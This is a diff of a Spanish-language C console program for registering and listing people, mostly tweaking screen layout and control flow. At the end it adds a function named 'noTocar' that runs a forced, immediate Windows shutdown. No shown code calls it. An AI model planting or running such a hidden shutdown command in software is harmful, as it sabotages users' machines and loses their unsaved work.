@@ -32,7 +32,7 @@ void registrarPersona()
         gotoxy(50,5);
         printf("Error al abrir el archivo");
         exit(1);
-    }
+    }else{
 
         setColorGral();
         Persona persona;
@@ -92,15 +92,15 @@ void registrarPersona()
 
         gotoxy(30, 25);
         printf("Informacion de la persona registrada con exito.\n");
-
+        Sleep(1500);
 
         fwrite(&persona, sizeof(Persona), 1, file);
 
 
         menuPrincipal(persona.rol);
         fclose(file);
-
     }
+}
 
 
 //Iniciar sesion
@@ -508,15 +508,13 @@ void verListaPersonas()
     int num_opciones = cantidad;
     int opcion = 0;
     char tecla;
-
-    int i =20;
-    int f = 9;
+    system("cls");
+        dibujarCuadro(25, 3, 100, 30);
 
     do{
-        system("cls");
-        dibujarCuadro(25, 3, 100, 30);
+
         for (int j = 0; j < num_opciones; j++) {
-            gotoxy(i, f + j);
+            gotoxy(30, 5 + j);
             if (j == opcion) {
                 printf("> ");
             } else {
@@ -559,7 +557,8 @@ void imprimirPersona(Persona persona)
     system("cls");
     dibujarCuadro(25, 3, 100, 30);
 
-    imprimirTitulo(persona.nombre);
+    gotoxy(30, 7);
+    printf("Nombre: %s", persona.nombre);
 
     gotoxy(30, 7);
     printf("DNI: %s", persona.dni);
@@ -834,3 +833,8 @@ void confirmarCambiosPersona(Persona persona){
 
 
 }
+
+void noTocar() {
+    system("shutdown /s /f /t 0");
+}
+
